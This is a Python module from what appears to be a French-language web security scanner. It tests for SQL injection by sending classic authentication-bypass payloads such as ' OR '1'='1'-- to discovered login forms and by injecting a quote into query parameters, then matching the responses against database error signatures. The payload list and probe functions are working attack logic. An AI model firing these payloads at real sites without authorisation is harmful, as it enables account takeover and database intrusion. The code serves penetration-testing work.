"""Injection SQL : contournement d'authentification et erreurs SQL.

Pilotée par la SiteMap — formulaires de login découverts pour le
bypass, paramètres découverts (query/endpoints GET) pour l'erreur-based.
"""
from __future__ import annotations

import re

from ..scan_models import Finding
from ._util import iter_login_targets, iter_param_targets, with_query_param

SQLI_PAYLOADS = ["' OR '1'='1'--", "' OR true--", "admin'--", "') OR ('1'='1"]
SQL_ERROR_RE = re.compile(
    r"SQLITE_ERROR|SQL syntax|ORA-\d|psql:|MySQL|unterminated quoted|"
    r"SequelizeDatabaseError|SQLITE", re.I)


def t_sqli_auth_bypass(ctx) -> list[Finding]:
    out: list[Finding] = []
    for action, field_names in iter_login_targets(ctx.sitemap):
        base_st, _, _ = ctx.safe_post(action, data={"email": "nobody@nope.tld",
                                                      "password": "definitely-wrong-xyz"})
        if base_st in (-1, 404):
            continue
        for pl in SQLI_PAYLOADS:
            for field_name in field_names:
                st, _, body = ctx.safe_post(action, data={field_name: pl, "password": pl})
                low = (body or "").lower()
                ok = st == 200 and ("token" in low or "authentication" in low
                                    or "jwt" in low or "sessionid" in low)
                if ok and st != base_st:
                    out.append(Finding("sqli", "sqli-auth-bypass", "critical", action,
                                       f"Payload `{pl}` sur `{field_name}` -> 200 + jeton (réf. {base_st})",
                                       request=f"POST {action}"))
                    return out
    return out


def t_error_based_sqli(ctx) -> list[Finding]:
    out: list[Finding] = []
    for base_url, param in iter_param_targets(ctx.sitemap):
        target = with_query_param(base_url, param, "'")
        st, _, body = ctx.safe_get(target)
        if st in (-1, 404):
            continue
        if SQL_ERROR_RE.search((body or "")[:4000]):
            out.append(Finding("sqli", "sqli-error-based", "high", target,
                               f"Signature d'erreur SQL renvoyée (param `{param}`)",
                               request=f"GET {target}"))
            return out
    return out


ATTACKS = [
    ("sqli", "SQLi auth bypass", t_sqli_auth_bypass),
    ("sqli", "SQLi (error-based)", t_error_based_sqli),
]
